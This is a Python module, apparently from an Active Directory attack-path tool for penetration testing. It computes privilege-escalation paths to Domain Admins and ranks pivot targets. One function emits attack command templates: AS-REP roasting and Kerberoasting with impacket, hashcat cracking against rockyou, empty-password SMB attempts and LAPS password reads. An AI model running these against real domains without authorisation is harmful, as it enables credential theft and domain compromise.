"""Path computation: dijkstra primary, shortest_simple_paths fallback."""

from itertools import islice

import networkx as nx

_STRUCTURAL = {"MemberOf", "Contains"}
_REPL_HALF_RIGHTS = {"GetChanges", "GetChangesAll", "GetChangesInFilteredSet"}


def _exploit_fingerprint(result: "PathResult") -> tuple:
    """Tuple of (src, rel, dst) for non-structural edges only."""
    return tuple(
        (e["src"], e["relation"], e["dst"])
        for e in result.edges
        if e["relation"] not in _STRUCTURAL
    )


def _is_actionable_edge(data: dict) -> bool:
    """Edge is non-actionable if its dominant relation is a replication
    half-right and the (src,dst) pair was never synthesized into DCSync.
    Used as the filter for `actionable_view`."""
    if data.get("relation") in _REPL_HALF_RIGHTS:
        return "DCSync" in (data.get("relations") or {})
    return True


def actionable_view(G: nx.DiGraph) -> nx.DiGraph:
    """Return a lightweight view of G that hides non-actionable edges.

    Pre-filtering before path-finding (rather than rejecting paths after the
    fact) means dijkstra never wastes its budget enumerating dead-ends, and
    we don't need an arbitrary scan cap to bound that work.
    """
    return nx.subgraph_view(
        G, filter_edge=lambda u, v: _is_actionable_edge(G[u][v])
    )


class PathResult:
    def __init__(self, nodes: list[str], edges: list[dict], weight: int):
        self.nodes = nodes
        self.edges = edges          # [{"src", "dst", "relation", "weight"}, ...]
        self.total_weight = weight
        self.hops = len(nodes) - 1

    def __repr__(self) -> str:
        return f"PathResult(hops={self.hops}, weight={self.total_weight})"


def _path_to_result(G: nx.DiGraph, path: list[str]) -> PathResult:
    edges = []
    total = 0
    for i in range(len(path) - 1):
        src, dst = path[i], path[i + 1]
        data = G[src][dst]
        w = data.get("weight", 5)
        total += w
        primary = data.get("relation", "Unknown")
        all_rels = data.get("relations", {primary: w})
        edges.append({
            "src": src,
            "dst": dst,
            "relation": primary,
            "weight": w,
            "relations": all_rels,
        })
    return PathResult(nodes=path, edges=edges, weight=total)


def find_paths(
    G: nx.DiGraph,
    source: str,
    target: str,
    k: int = 3,
) -> list[PathResult]:
    """Find up to *k* lowest-resistance paths. Returns [] if none exist."""
    if source not in G:
        raise ValueError(f"Source node not in graph: {source}")
    if target not in G:
        raise ValueError(f"Target node not in graph: {target}")

    results: list[PathResult] = []

    # Pre-filter: drop non-actionable edges (e.g. lone replication half-rights
    # that don't synthesize into DCSync) before path-finding so dijkstra never
    # considers them. Path-level fingerprint dedup still runs on top.
    Gv = actionable_view(G)
    if source not in Gv or target not in Gv:
        return results

    try:
        gen = nx.shortest_simple_paths(Gv, source, target, weight="weight")
        seen_fps: set[tuple] = set()
        # k * 10 is plenty once dead-ends are pre-filtered; cap is just a
        # safety belt against pathological graphs with massive edge fan-out.
        for path in islice(gen, k * 10):
            r = _path_to_result(Gv, path)
            fp = _exploit_fingerprint(r)
            if fp in seen_fps:
                continue
            seen_fps.add(fp)
            results.append(r)
            if len(results) >= k:
                break
    except (nx.NetworkXNoPath, nx.NodeNotFound):
        pass

    return results


_HIGH_VALUE_NAME_HINTS = (
    "domain admins", "enterprise admins", "schema admins", "administrators",
    "domain controllers", "account operators", "backup operators",
    "server operators", "print operators", "key admins", "enterprise key admins",
    "exchange windows permissions", "exchange trusted subsystem",
    "organization management", "dnsadmins",
)


def _node_value_score(G: nx.DiGraph, nid: str) -> int:
    """Score how interesting a node is as a fallback target.

    Higher = more interesting. Used to rank reachable-but-not-DA targets.
    """
    if nid not in G:
        return 0
    score = 0
    props = G.nodes[nid].get("props", {})
    name = G.nodes[nid].get("name", nid).lower()
    kind = G.nodes[nid].get("kind", "")

    if props.get("highvalue") or props.get("HighValue"):
        score += 50
    if props.get("admincount"):
        score += 20
    for hint in _HIGH_VALUE_NAME_HINTS:
        if hint in name:
            score += 30
            break
    if kind == "computers":
        score += 5
        # DC?
        for _, dst in G.out_edges(nid):
            if "domain controllers" in G.nodes[dst].get("name", "").lower() and G[nid][dst].get("relation") == "MemberOf":
                score += 60
                break
    if kind == "domains":
        score += 40
    if props.get("unconstraineddelegation"):
        score += 25
    if props.get("hasspn"):
        score += 5
    if props.get("dontreqpreauth"):
        score += 5
    # Penalize structural sinks
    if kind in ("ous", "containers"):
        score -= 10
    return score


def find_intermediate_targets(
    G: nx.DiGraph,
    source: str,
    excluded: set[str] | None = None,
    top_n: int = 10,
    max_hops: int = 6,
) -> list[dict]:
    """List valuable nodes reachable from source via the graph.

    Returns [{node, score, path}, ...] sorted by score desc.

    Note: if source has *any* path to the DA target (direct or multi-hop),
    `find_paths()` will surface it — Dijkstra on the full graph already
    composes long chains. This helper is for the case where source has no
    onward connectivity to DA at all (not in the DA subgraph) — then it
    surfaces the next best high-value targets the user can still pivot to,
    even if they themselves don't reach DA.
    """
    if source not in G:
        return []
    excluded = excluded or set()

    reachable: dict[str, int] = {source: 0}
    frontier = [source]
    while frontier:
        nxt = []
        for n in frontier:
            depth = reachable[n]
            if depth >= max_hops:
                continue
            for _, succ in G.out_edges(n):
                if succ in reachable:
                    continue
                reachable[succ] = depth + 1
                nxt.append(succ)
        frontier = nxt

    candidates: list[tuple[int, str]] = []
    for nid in reachable:
        if nid == source or nid in excluded:
            continue
        score = _node_value_score(G, nid)
        if score <= 0:
            continue
        candidates.append((score, nid))
    candidates.sort(key=lambda x: (-x[0], reachable[x[1]]))

    Gv = actionable_view(G)
    out: list[dict] = []
    for score, nid in candidates[:top_n]:
        if nid not in Gv:
            out.append({"node": nid, "score": score, "path": None})
            continue
        try:
            path_nodes = nx.dijkstra_path(Gv, source, nid, weight="weight")
            pr = _path_to_result(Gv, path_nodes)
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            pr = None
        out.append({"node": nid, "score": score, "path": pr})
    return out


def find_pivot_candidates(
    G: nx.DiGraph,
    target: str,
    pruned: nx.DiGraph,
    top_n: int = 15,
    excluded_sources: set[str] | None = None,
) -> list[dict]:
    """Find principals that ALREADY have a path to DA and are compromisable.

    These are the *true pivots*: out-of-band compromise of any of them
    (Kerberoast, AS-REP roast, weak/empty password, LAPS read, AdminTo from
    a host you control) hands you a node *inside* the DA subgraph — meaning
    the existing graph paths from that node to DA become exploitable.

    Returns [{
        "node": id,
        "vectors": list[str],     # how to compromise out-of-band
        "vector_commands": list[str],
        "path_to_da": PathResult | None,
        "score": int,
    }, ...] sorted by score desc.
    """
    excluded_sources = excluded_sources or set()
    pruned_v = actionable_view(pruned)
    out: list[dict] = []

    for nid in pruned.nodes:
        if nid == target or nid in excluded_sources:
            continue
        kind = G.nodes[nid].get("kind", "")
        if kind not in ("users", "computers"):
            continue
        p = G.nodes[nid].get("props", {})
        name = G.nodes[nid].get("name", nid)

        vectors: list[str] = []
        cmds: list[str] = []
        score = 0

        # Out-of-band attack vectors
        if kind == "users":
            short = name.split("@", 1)[0] if "@" in name else name.split(".")[0]
            d = name.rsplit("@", 1)[1] if "@" in name else "<DOMAIN>"

            if p.get("dontreqpreauth"):
                vectors.append("AS-REP roast (no creds needed)")
                cmds.extend([
                    f"impacket-GetNPUsers '{d}/' -no-pass -usersfile <(echo {short}) -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash",
                    "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
                ])
                score += 30
            if p.get("hasspn") and short.lower() != "krbtgt":
                vectors.append("Kerberoast")
                cmds.extend([
                    f"impacket-GetUserSPNs '{d}/<owned_user>:<owned_pass>' -dc-ip <DC_IP> -request-user '{short}' -outputfile kerb.hash",
                    "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
                ])
                score += 25
            if p.get("passwordnotreqd"):
                vectors.append("PasswordNotRequired (try empty/weak)")
                cmds.append(f"nxc smb <DC_IP> -d {d} -u '{short}' -p '' --no-bruteforce")
                score += 20

        elif kind == "computers":
            if p.get("haslaps"):
                vectors.append("LAPS — read local admin password if you can")
                cmds.append(
                    f"impacket-GetLAPSPassword '<DOMAIN>/<owned_user>:<owned_pass>@<DC_IP>' "
                    f"-computer '{name.split('.')[0]}'"
                )
                score += 15
            if p.get("unconstraineddelegation"):
                vectors.append("Unconstrained delegation — get local admin then capture DC TGT")
                score += 25

        # Position-based score boost
        if p.get("admincount"):
            score += 10
        if p.get("highvalue") or p.get("HighValue"):
            score += 15

        if not vectors:
            continue

        if nid not in pruned_v or target not in pruned_v:
            continue
        try:
            path_nodes = nx.dijkstra_path(pruned_v, nid, target, weight="weight")
            ptd = _path_to_result(pruned_v, path_nodes)
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            ptd = None
        if ptd is None:
            continue

        # Closer to DA = better
        score += max(0, 30 - 3 * ptd.hops)

        out.append({
            "node": nid,
            "vectors": vectors,
            "vector_commands": cmds,
            "path_to_da": ptd,
            "score": score,
        })

    out.sort(key=lambda x: -x["score"])
    return out[:top_n]


def find_outbound_object_control(
    G: nx.DiGraph,
    node_id: str,
) -> list[dict]:
    """List objects this node has privileges over (direct + via group membership).

    Returns [{"dst", "relation", "via_group"}, ...] where via_group is the
    display name of the intermediary group, or None for direct edges.
    Structural relations (MemberOf, Contains) are excluded.
    """
    if node_id not in G:
        return []

    groups: dict[str, str] = {}
    frontier = [node_id]
    visited = {node_id}
    while frontier:
        nxt = []
        for n in frontier:
            for _, succ in G.out_edges(n):
                if G[n][succ].get("relation") == "MemberOf" and succ not in visited:
                    visited.add(succ)
                    groups[succ] = G.nodes[succ].get("name", succ) if succ in G else succ
                    nxt.append(succ)
        frontier = nxt

    seen: set[tuple] = set()
    results: list[dict] = []

    def _emit(src_id: str, dst: str, via_group: str | None):
        data = G[src_id][dst]
        rels = data.get("relations") or {data.get("relation", "Unknown"): data.get("weight", 5)}
        for rel in rels:
            if rel in ("MemberOf", "Contains"):
                continue
            key = (dst, rel, via_group)
            if key not in seen:
                seen.add(key)
                results.append({"dst": dst, "relation": rel, "via_group": via_group})

    for _, dst in G.out_edges(node_id):
        _emit(node_id, dst, None)

    for grp_id, grp_name in groups.items():
        for _, dst in G.out_edges(grp_id):
            _emit(grp_id, dst, grp_name)

    priority = {
        "GenericAll": 0,
        "WriteDacl": 1,
        "WriteOwner": 2,
        "Owns": 3,
        "AllExtendedRights": 4,
        "GenericWrite": 5,
        "AddKeyCredentialLink": 6,
        "ForceChangePassword": 7,
        "AdminTo": 8,
        "CanPSRemote": 9,
        "CanRDP": 10,
        "ExecuteDCOM": 11,
    }
    results.sort(key=lambda x: (
        x["via_group"] is not None,
        priority.get(x["relation"], 50),
        x["relation"],
    ))
    return results


def find_inbound_object_control(
    G: nx.DiGraph,
    node_id: str,
) -> list[dict]:
    """List principals that have direct privileges over this node.

    Returns [{"src", "relation"}, ...] excluding structural relations.
    """
    if node_id not in G:
        return []
    results = []
    for src, _ in G.in_edges(node_id):
        data = G[src][node_id]
        rels = data.get("relations") or {data.get("relation", "Unknown"): data.get("weight", 5)}
        for rel in rels:
            if rel in ("MemberOf", "Contains"):
                continue
            results.append({"src": src, "relation": rel})
    results.sort(key=lambda x: (x["src"], x["relation"]))
    return results


def find_inbound_sources(
    G: nx.DiGraph,
    target_node: str,
    top_n: int = 10,
) -> list[dict]:
    """Find principals that have a path leading TO *target_node* (inbound).

    Reverses the graph to discover all ancestors, scores them by how
    interesting they are as potential attackers, and returns the top N
    with their attack path.

    Returns [{"node", "score", "path"}, ...] sorted by score desc.
    """
    if target_node not in G:
        return []
    R = G.reverse(copy=False)
    try:
        ancestors = nx.descendants(R, target_node)
    except nx.NetworkXError:
        return []
    if not ancestors:
        return []

    scored: list[tuple[int, str]] = []
    for nid in ancestors:
        kind = G.nodes[nid].get("kind", "")
        if kind not in ("users", "computers", "groups"):
            continue
        p = G.nodes[nid].get("props", {})
        score = 0
        if kind == "users":
            score += 20
            if p.get("dontreqpreauth"):
                score += 15
            if p.get("hasspn"):
                score += 10
            if p.get("passwordnotreqd"):
                score += 10
        elif kind == "computers":
            score += 10
            if p.get("unconstraineddelegation"):
                score += 15
        elif kind == "groups":
            score += 5
        if p.get("admincount"):
            score += 5
        if p.get("highvalue") or p.get("HighValue"):
            score += 8
        scored.append((score, nid))

    scored.sort(key=lambda x: -x[0])

    Gv = actionable_view(G)
    out: list[dict] = []
    for base_score, nid in scored[:top_n * 3]:
        if nid not in Gv or target_node not in Gv:
            continue
        try:
            path_nodes = nx.dijkstra_path(Gv, nid, target_node, weight="weight")
            pr = _path_to_result(Gv, path_nodes)
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            pr = None
        if pr is None:
            continue
        hop_bonus = max(0, 10 - pr.hops * 2)
        out.append({"node": nid, "score": base_score + hop_bonus, "path": pr})
        if len(out) >= top_n:
            break

    out.sort(key=lambda x: -x["score"])
    return out


def suggest_similar_nodes(G: nx.DiGraph, query: str, top_n: int = 3) -> list[str]:
    """Return top_n node IDs most similar to *query*.

    Prefers nodes of kind 'users' since -u expects user identities.
    Falls back to all node types if not enough user matches.
    """
    try:
        from thefuzz import process as fuzz_process

        def _candidates(kind_filter: str | None) -> dict[str, str]:
            result: dict[str, str] = {}
            for nid in G.nodes:
                if kind_filter and G.nodes[nid].get("kind") != kind_filter:
                    continue
                name = G.nodes[nid].get("name", nid)
                result[name] = nid
                if nid != name:
                    result[nid] = nid
            return result

        seen: list[str] = []
        for kind in ("users", None):
            cands = _candidates(kind)
            hits = fuzz_process.extract(query, list(cands.keys()), limit=top_n * 2)
            for label, _score, *_ in hits:
                nid = cands[label]
                if nid not in seen:
                    seen.append(nid)
                if len(seen) >= top_n:
                    return seen
        return seen

    except ImportError:
        q = query.lower()
        # Prefer user nodes
        user_matches = [
            nid for nid in G.nodes
            if G.nodes[nid].get("kind") == "users" and q in nid.lower()
        ]
        if len(user_matches) >= top_n:
            return user_matches[:top_n]
        all_matches = [nid for nid in G.nodes if q in nid.lower()]
        return all_matches[:top_n]
